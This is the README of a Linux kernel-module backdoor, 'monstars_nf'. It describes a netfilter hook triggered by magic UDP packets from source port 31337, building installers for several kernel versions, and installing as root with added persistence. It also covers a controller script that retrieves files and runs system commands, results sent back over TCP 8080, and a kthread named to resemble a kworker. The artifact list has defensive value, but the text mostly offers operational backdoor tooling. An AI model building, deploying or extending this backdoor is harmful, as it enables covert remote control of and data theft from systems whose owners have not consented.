# monstars netfilter

**monstars_nf** is a linux backdoor intended to be compatible with a wide range of kernel versions.

Once installed, the kernel module installs a netfilter hook to listen for "magic" UDP packets from source port `31337`. When it receives such a packet, it spawns a usermode task handler to parse the command data, process any commands, and send the results back to the listening controller.

The backdoor does not listen on a port or maintain a consistent usermode process; for the most part, the only active component is the kernel-mode worker thread.


## Building an Installer

To build the installer, you will need kernel headers for the version of linux you want to target. Depending on your build environment, this may be challening to configure.

Once your build environment is set up, however, use the Python script `build_monstars.py` to build an installer specific to your target environment. The following attributes are configurable:
 - kernel object name
 - target kernel version
 - debugging output

The configured installer will be placed in the `./export/` directory, and will be named `go-monstars_<kernel version>`.

**$ python3 build_monstars.py**
```
usage: build_monstars.py [-h] [-d]
                         [-v {3.11.0-12-generic,3.13.0-24-generic,4.4.0-21-generic,4.15.0-20-generic,5.15.0-56-generic}]
                         [-k KO_NAME]

Build a monstars_nf installer binary

optional arguments:
  -h, --help            show this help message and exit
  -d, --debug           build components with debug symbols
  -v {3.11.0-12-generic,3.13.0-24-generic,4.4.0-21-generic,4.15.0-20-generic,5.15.0-56-generic}, --kernel-ver {3.11.0-12-generic,3.13.0-24-generic,4.4.0-21-generic,4.15.0-20-generic,5.15.0-56-generic}
                        linux kernel version to build against
  -k KO_NAME, --ko-name KO_NAME
                        name to use for the kernel netfilter module
```


## Running the Installer

The installer binary requires one commandline argument: the desired path to the usermode executable component.
```
# go-monstars /home/zathras/.ssh/monstars
```

The installer must be run with `root` permissions to successfully insert the kernel module.

Once **monstars_nf** is installed, the installer can be either cleaned up or added to some form of persistence mechanism to ensure the backdoor survives a system restart.


## Sending Commands

The Python script `call_monstars.py` is a CLI interface for sending commands to an installed backdoor. Pass `-h` to the command line for more information on each of the commands.

**$ python3 call_monstars.py**
```
usage: call_monstars.py [-h] -i IP [--dest-port DEST_PORT] {ping,get,exec} ...

send it!

positional arguments:
  {ping,get,exec}       [supported commands]
    ping                ping a target
    get                 retrieve a file
    exec                run a system command

optional arguments:
  -h, --help            show this help message and exit
  -i IP, --ip IP        IP address of host machine
  --dest-port DEST_PORT
                        destination port number
```


## Communications

When it receives a magic UDP packet, the backdoor sends its task result back to the sender on TCP port 8080.

The controller opens TCP port 8080 before sending the magic packet, and reports an error if no response is received after a short timeout.


## Artifacts

Once installed, the following artifacts are present on the system:
 - The userland task handler binary (name and path configurable)
 - The kernel module (name configurable) - it is out-of-band and therefore "taints" the kernel
 - The procfile `/proc/task`, which is used to send tasking data to the userland process from kernel mode
 - An active kthread named `kworker/l:1` (visible in `top`)
 - The installer binary (if left in place along with some means of persistence)
